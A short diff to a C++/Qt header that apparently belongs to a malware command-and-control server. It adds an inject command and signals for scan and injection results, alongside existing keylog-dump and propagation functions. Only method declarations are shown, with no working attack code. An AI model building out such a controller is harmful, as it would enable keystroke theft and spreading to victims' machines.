@@ -36,6 +36,7 @@ public:
     void requestKeylogDump(const QString& ip);
     void disconnectAgent(const QString& ip);
     void sendPropagationCommand(const QString& ip, uint8_t cmd, const QString& target);
+    void sendInjectCommand(const QString& ip, const QString& targetPath);
 
     // Getters
     [[nodiscard]] bool     isRunning() const;
@@ -48,6 +49,8 @@ signals:
     void processListReceived(const QString& ip, const QString& output);
     void keylogReceived(const QString& ip, const QString& data);
     void propagationResultReceived(const QString& ip, const QString& result);
+    void scanResultReceived(const QString& ip, const QString& report);
+    void injectResultReceived(const QString& ip, bool success, const QString& targetPath);
     void statusMessage(const QString& message);
 
 private:
